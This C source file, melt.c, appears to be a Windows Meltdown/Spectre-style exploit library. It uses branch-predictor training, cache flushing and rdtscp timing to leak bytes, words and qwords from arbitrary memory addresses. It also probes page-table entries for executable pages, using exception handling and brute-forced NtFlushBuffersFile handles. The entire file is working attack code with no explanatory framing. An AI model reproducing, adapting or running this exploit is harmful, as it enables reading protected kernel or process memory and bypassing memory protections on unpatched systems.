//////////////////////////////////////////////////////////////////////////////

/* melt.c */

//////////////////////////////////////////////////////////////////////////////

typedef struct _IO_STATUS_BLOCK
{
  union
  {
    NTSTATUS Status;
    PVOID Pointer;
  } DUMMYUNIONNAME;

  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

//////////////////////////////////////////////////////////////////////////////

void _leaker_function ( unsigned __int64 x );

//////////////////////////////////////////////////////////////////////////////

#define ELEMENT_SIZE 0x1000

//////////////////////////////////////////////////////////////////////////////

// Array acceded by the leaker code
unsigned char array1 [] = { 0 };

// Array size to be marked by Meltdown
unsigned int array1_size = 1;

// Global variable to be used by the leaker code
unsigned char temp;

// To be used by the timer
int junk;

// Test array
unsigned char *array2 = NULL;

// Base and limit for leaking values
unsigned int leak_base = 0;
unsigned int leak_limit = 256;

// Pointer to leaker function
void ( *p_leaker_function ) ( unsigned __int64 x ) = _leaker_function;

//////////////////////////////////////////////////////////////////////////////

void _leaker_function ( unsigned __int64 x )
{
// Only taken if X = 0
  if ( x < array1_size ) // <----- Here the SPECULATIVE EXECUTION bypass (reads beyond "array1" limits)
  {
  // This path shouldn't be taken
    if ( x != 0 )
    {
    // If there is something to read (it improves a lot the reliability!)
      if ( * ( unsigned __int64 * ) &array1 [ x ] != 0 )
      {
      // Indexing value
        temp = array2 [ array1 [ x ] * ELEMENT_SIZE ]; // <---- Here the leak!
      }
    }
  }
}

//////////////////////////////////////////////////////////////////////////////

void _leaker_function_pte_exec ( unsigned __int64 x )
{
// Only taken if X = 0
  if ( x < array1_size ) // <----- Here the SPECULATIVE EXECUTION bypass (reads beyond "array1" limits)
  {
  // This path shouldn't be taken
    if ( x != 0 )
    {
    // If it's a PTE with NX disabled
      if ( ( * ( unsigned __int64 * ) &array1 [ x ] & 0x80000000000000ff ) == 0x63 )
      {
      // Indexing value
        temp = array2 [ array1 [ x ] * ELEMENT_SIZE ]; // <---- Here the leak!
      }
    }
  }
}

//////////////////////////////////////////////////////////////////////////////

void leaker_function ( unsigned __int64 x )
{
  p_leaker_function ( x );
}

//////////////////////////////////////////////////////////////////////////////

void _flush_speculator ( unsigned __int64 x )
{
// Only taken if X = 0
  if ( x < array1_size )
  {
  // Indexing value
    temp = array1 [ x ];
  }
}

//////////////////////////////////////////////////////////////////////////////

void flush_speculator ( char *address )
{
  unsigned __int64 malicious_x;
  unsigned __int64 x;
  int j;

//////////////////

// Address to be flushed: address + 0x1000
  malicious_x = address + 0x1000 - array1;

//////////////////

// Flushing cache for original array
  _mm_clflush ( &array1 );

//////////////////

// Forcing to cheat the speculative execution
  for ( j = 0 ; j <= 33 * 3 ; j ++ )
  {
  // Flusing memory
    _mm_clflush ( &array1_size );
    _mm_mfence ();

  /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
  /* Avoid jumps in case those tip off the branch predictor */
    x = ((j % 33) - 1) & ~0xFFFF; /* Set x=FFFF'0000 if j%33==0, else x=0 */ // <--- WORKING PERFECT !!!
    x = (x | (x >> 16)); /* Set x=-1 if j&33=0, else x=0 */
    x = x & malicious_x;

  // Leaking data when branch predictor is working
    _flush_speculator ( ( unsigned __int64 ) x );
  }
}

//////////////////////////////////////////////////////////////////////////////

int __leak_byte ( int max_tries , char *address , unsigned char *c )
{
  unsigned int times [ 256 ];
  int tries, i, j;
  unsigned __int64 malicious_x;
  unsigned __int64 x;
  unsigned __int64 time1, time2;
  char *addr;
  int ret = FALSE;

  unsigned int average;
  unsigned int best_time;
  unsigned int cont;
  unsigned int sum;
  int best_pos;

//////////////////

// Flushing caches ... it flushes the caches used by the speculative execution
  flush_speculator ( address );

//////////////////

// Initialyzing times
  for ( cont = leak_base ; cont < leak_limit ; cont ++ )
  {
  // Initialyzing next time
    times [ cont ] = 0xffffffff;
  }

//////////////////

// Calculating 
  malicious_x = address - array1;

//////////////////

// Flushing cache for original array
  _mm_clflush ( &array1 );

//////////////////

// Repeating process 'n' times
  for ( tries = 0 ; tries < max_tries ; tries ++ )
  {
  // Flushing cache for original array
    _mm_clflush ( &array1 );

  /* Flush array2[256*(0..255)] from cache */
    for ( i = leak_base ; i < leak_limit ; i++ )
    {
    // Flushing cache levels
      _mm_clflush ( &array2 [ i * ELEMENT_SIZE ] );
    }

//////////////////

  // Forcing to cheat the speculative execution
    for ( j = 0 ; j <= 33 * 3 ; j ++ ) // A good loop number to trigger the speculative execution
    {
    // Flusing memory
      _mm_clflush ( &array1_size );
      _mm_mfence ();

    /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
    /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 33) - 1) & ~0xFFFF; /* Set x=FFFF'0000 if j%33==0, else x=0 */ // <--- WORKING PERFECT !!!
      x = (x | (x >> 16)); /* Set x=-1 if j&33=0, else x=0 */
      x = x & malicious_x;

    // Leaking data when branch predictor is working
      leaker_function ( ( unsigned __int64 ) x );
    }

//////////////////

  // Checking entry by entry
    for ( i = leak_base ; i < leak_limit ; i++ )
    {
    // Serializing memory operations
      _mm_mfence ();

    // Pointing to the next element
      addr = &array2 [ i * ELEMENT_SIZE ];

    // Taking time
      time1 = __rdtscp(&junk); /* READ TIMER */
      junk = *addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

    // If this time is better
      if ( time2 < times [ i ] )
      {
      // A new record
        times [ i ] = time2;
      }
    }
  }

  ////////////////

// Initialyzing sum
  sum = 0;

// Looking for best time
  for ( cont = leak_base ; cont < leak_limit ; cont ++ )
  {
  // suming next time
    sum += times [ cont ];
  }

// Calculating average
  average = sum / ( leak_limit - leak_base );

  ////////////////

// Initialyzing best time
  best_time = 0xffffffff;
  best_pos = -1;

// Looking for best time
  for ( cont = leak_base ; cont < leak_limit ; cont ++ )
  {
  // If this time is better
    if ( times [ cont ] < best_time )
    {
    // A new best time
      best_time = times [ cont ];
      best_pos = cont;
    }
  }

  ////////////////

//  printf ( "%x: %i\n" , best_pos , best_time );

// If it's a good candidate
  if ( best_time <= average / 2 )
  {
//    printf ( "%x: %i/%i\n" , best_pos , best_time , average );

  // Returning 1
    *c = best_pos;

  // Returning OK
    ret = TRUE;
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int _leak_byte ( void *address , unsigned char *c )
{
  unsigned int cont;
  int ret = FALSE;

// If it's the first time
  if ( array2 == NULL )
  {
  // Allocating test array
    array2 = VirtualAlloc ( NULL , 256 * ELEMENT_SIZE , MEM_COMMIT | MEM_RESERVE , PAGE_READWRITE );
//    printf ( "[+] Array2: 0x%I64x\n" , ( unsigned __int64 ) array2 );

  // Mapping memory
    memset ( array2 , 0x33 , 256 * ELEMENT_SIZE );
  }

// Leaking byte
  ret = __leak_byte ( 3 , address , c ); // <---- 3 repetitions is the best one

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int leak_byte ( void *address , unsigned char *c )
{
  int ret;

// Leaking data
  ret = _leak_byte ( address , c );

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

void use_api_help ( void )
{
  static int ( *NtFlushBuffersFile ) ( HANDLE , IO_STATUS_BLOCK * ) = NULL;
  static HANDLE flush_handle = NULL;
  IO_STATUS_BLOCK IoStatusBlock = { 0 , 0 };
  unsigned int cont;

// If there is not valid handle
  if ( NtFlushBuffersFile == NULL )
  {
  // Solving cache function
    NtFlushBuffersFile = ( int ( * ) ( HANDLE , void * ) ) GetProcAddress ( GetModuleHandle ( "ntdll.dll" ) , "NtFlushBuffersFile" );

  // Looking for a valid handle
    for ( cont = 4 ; cont < 0x10000 ; cont += 4 )
    {
    // If the flush worked
      if ( NtFlushBuffersFile ( ( HANDLE ) ( ( unsigned short ) cont ) , ( void * ) &IoStatusBlock ) == 0 )
      {
      // Saving a flusheable handle
        flush_handle = ( HANDLE ) ( ( unsigned short ) cont );

      // Stop processing
        break;
      }
    }
  }
  else
  {
  // Flushing handle to flush Paging Tables
    NtFlushBuffersFile ( flush_handle , &IoStatusBlock );
//    printf ( "%i %x\n" , NtFlushBuffersFile ( flush_handle , &IoStatusBlock ) , flush_handle );
  }
}

//////////////////////////////////////////////////////////////////////////////

int leak_byte_seh_help ( void *address , unsigned char *c )
{
  int ret = FALSE;

// Raising an exception
  IsBadReadPtr ( ( void * ) 0x9090909090909090 , 1 );

// If data could be leaked
  if ( leak_byte ( address , c ) == TRUE )
  {
  // Returning OK
    ret = TRUE;
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int leak_byte_api_help ( void *address , unsigned char *c )
{
  int ret = FALSE;

// Using API to flush/cache TLBs
  use_api_help ();

// If data could be leaked
  if ( leak_byte ( address , c ) == TRUE )
  {
  // Returning OK
    ret = TRUE;
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int leak_byte_always ( void *address , unsigned char *c )
{
  unsigned int cont;
  int ret = FALSE;

// Repeating 1000 times as maximum (watchdow)
  for ( cont = 0 ; cont < 1000 ; cont ++ )
  {
  // If data could be leaked
    if ( leak_byte ( address , c ) == TRUE )
    {
    // Returning OK
      ret = TRUE;

    // Stop processing
      break;
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int leak_byte_always_with_check ( void *address , unsigned char *c )
{
  unsigned int matchs [ 256 ];
  unsigned char leaked_byte;
  unsigned int best_match;
  unsigned int best_pos;
  unsigned int cont;
  int ret = FALSE;

///////////

// Initialyzing match list
  for ( cont = 0 ; cont < 256 ; cont ++ )
  {
  // Initialyzing next element
    matchs [ cont ] = 0;
  }

///////////

// Leaking 10 times
  for ( cont = 0 ; cont < 10 ; cont ++ )
  {
  // If byte could be leaked
    if ( leak_byte_always ( address , &leaked_byte ) == TRUE )
    {
    // A new match
      matchs [ leaked_byte ] ++;

    // If 3 matchs are present
      if ( matchs [ leaked_byte ] == 3 )
      {
      // It's enough to stop finding
        break;
      }
    }
  }

///////////

// Initialyzing matchs
  best_match = 0;
  best_pos = 0;

// Looking for best match
  for ( cont = 0 ; cont < 256 ; cont ++ )
  {
  // If this match is better
    if ( best_match < matchs [ cont ] )
    {
    // A new best match
      best_match = matchs [ cont ];
      best_pos = cont;
    }
  }

///////////

// If there is a good match
  if ( best_match > 0 )
  {
  // Returning leaked byte
    *c = best_pos;

  // Returning OK
    ret = TRUE;
  }

///////////

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int leak_byte_always_XX ( void *address , unsigned char *c )
{
  int ret = FALSE;

// If it's possible to leak by using SEH
  if ( leak_byte_always_seh ( address , c ) == TRUE )
  {
  // Returning OK
    ret = TRUE;
  }
// If it's possible to leak by using API
  else if ( leak_byte_always_api ( address , c ) == TRUE )
  {
  // Returning OK
    ret = TRUE;
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

unsigned char get_byte ( char *address )
{
  unsigned char value = 0;
  unsigned int cont;

// Reading a byte
  for ( cont = 0 ; cont < sizeof ( value ) ; cont ++ )
  {
  // Leaking next byte
    if ( leak_byte_always_with_check ( address + cont , ( unsigned char * ) &value + cont ) == FALSE )
    {
    // This value is not reliable
      return ( 0 );
    }
  }

  return ( value );
}

//////////////////////////////////////////////////////////////////////////////

unsigned short get_word ( char *address )
{
  unsigned short value = 0;
  unsigned int cont;

// Reading a short value
  for ( cont = 0 ; cont < sizeof ( value ) ; cont ++ )
  {
  // Leaking next byte
    if ( leak_byte_always_with_check ( address + cont , ( unsigned char * ) &value + cont ) == FALSE )
    {
    // This value is not reliable
      return ( 0 );
    }
  }

  return ( value );
}

//////////////////////////////////////////////////////////////////////////////

unsigned int get_dword ( char *address )
{
  unsigned int value = 0;
  unsigned int cont;

// Reading 4 bytes
  for ( cont = 0 ; cont < sizeof ( value ) ; cont ++ )
  {
  // Leaking next byte
    if ( leak_byte_always_with_check ( address + cont , ( unsigned char * ) &value + cont ) == FALSE )
    {
    // This value is not reliable
      return ( 0 );
    }
  }

  return ( value );
}

//////////////////////////////////////////////////////////////////////////////

unsigned __int64 get_qword ( char *address )
{
  unsigned __int64 value = 0;
  unsigned int cont;

// Reading 8 bytes
  for ( cont = 0 ; cont < sizeof ( value ) ; cont ++ )
  {
  // Leaking next byte
    if ( leak_byte_always_with_check ( address + cont , ( unsigned char * ) &value + cont ) == FALSE )
    {
    // This value is not reliable
      return ( 0 );
    }
  }

  return ( value );
}

//////////////////////////////////////////////////////////////////////////////

int leak_byte_always_seh ( void *address , unsigned char *c )
{
  unsigned int cont;
  int ret = FALSE;

// Repeating 100 times as maximum (watchdow)
  for ( cont = 0 ; cont < 100 ; cont ++ )
  {
  // If data could be leaked
    if ( leak_byte_seh_help ( address , c ) == TRUE )
    {
    // Returning OK
      ret = TRUE;

    // Stop processing
      break;
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int leak_byte_always_api ( void *address , unsigned char *c )
{
  unsigned int cont;
  int ret = FALSE;

// Repeating 100 times as maximum (watchdow)
  for ( cont = 0 ; cont < 100 ; cont ++ )
  {
  // If data could be leaked
    if ( leak_byte_api_help ( address , c ) == TRUE )
    {
    // Returning OK
      ret = TRUE;

    // Stop processing
      break;
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int is_pte_executable ( int use_seh_help , void *address )
{
  void *original_fp;
  unsigned int original_leak_base;
  unsigned int original_leak_limit;
  unsigned char leaked_byte;
  int ret = FALSE;

// Getting original function pointer
  original_fp = p_leaker_function;

// Changing to custom pointer
  p_leaker_function = _leaker_function_pte_exec;

// Saving original leak values limit
  original_leak_base = leak_base;
  original_leak_limit = leak_limit;

// Setting new limits (for performance)
  leak_base = 0x62;
  leak_limit = 0x65;

// If it uses SEH to cache TLBs
  if ( use_seh_help == TRUE )
  {
  // If data could be leaked
    if ( leak_byte_seh_help ( address , &leaked_byte ) == TRUE )
    {
    // If it's a PTE with NX bit disabled
      if ( leaked_byte == 0x63 )
      {
      // Returning OK
        ret = TRUE;
      }
    }
  }
// If it uses a Windows API to cache TLBs
  else
  {
  // If data could be leaked
    if ( leak_byte_api_help ( address , &leaked_byte ) == TRUE )
    {
    // If it's a PTE with NX bit disabled
      if ( leaked_byte == 0x63 )
      {
      // Returning OK
        ret = TRUE;
      }
    }
  }

// Restoring leak values limit
  leak_base = original_leak_base;
  leak_limit = original_leak_limit;

// Restoring function pointer
  p_leaker_function = original_fp;

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int is_pte_executable_pure ( void *address )
{
  void *original_fp;
  unsigned int original_leak_base;
  unsigned int original_leak_limit;
  unsigned char leaked_byte;
  int ret = FALSE;

// Getting original function pointer
  original_fp = p_leaker_function;

// Changing to custom pointer
  p_leaker_function = _leaker_function_pte_exec;

// Saving original leak values limit
  original_leak_base = leak_base;
  original_leak_limit = leak_limit;

// Setting new limits (for performance)
  leak_base = 0x62;
  leak_limit = 0x65;

// If data could be leaked
  if ( leak_byte ( address , &leaked_byte ) == TRUE )
  {
  // If it's a PTE with NX bit disabled
    if ( leaked_byte == 0x63 )
    {
    // Returning OK
      ret = TRUE;
    }
  }

// Restoring leak values limit
  leak_base = original_leak_base;
  leak_limit = original_leak_limit;

// Restoring function pointer
  p_leaker_function = original_fp;

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int is_pte_executable_api ( void *address )
{
  unsigned char leaked_byte;
  unsigned int cont;
  int ret = FALSE;

// Using API to flush/cache TLBs
  use_api_help ();

// Checking 3 times
  for ( cont = 0 ; cont < 3 ; cont ++ )
  {
  // If it's a PTE (fast check)
    if ( is_pte_executable_pure ( address ) == TRUE )
    {
    // Returning OK
      ret = TRUE;

    // Stop processing
      break;
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int is_pte_executable_seh ( void *address )
{
  unsigned int cont;
  int ret = FALSE;

// Checking 3 times
  for ( cont = 0 ; cont < 3 ; cont ++ )
  {
  // If it's a PTE
    if ( is_pte_executable ( TRUE , address ) == TRUE )
    {
    // Returning OK
      ret = TRUE;

    // Stop processing
      break;
    }
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////

int is_pte_executable_XX ( void *address )
{
  int ret = FALSE;

// If it's a PTE (using SEH)
  if ( is_pte_executable_seh ( address ) == TRUE )
  {
  // Returning OK
    ret = TRUE;
  }
// If it's a PTE (using API)
  else if ( is_pte_executable_api ( address ) == TRUE )
  {
  // Returning OK
    ret = TRUE;
  }

  return ( ret );
}

//////////////////////////////////////////////////////////////////////////////
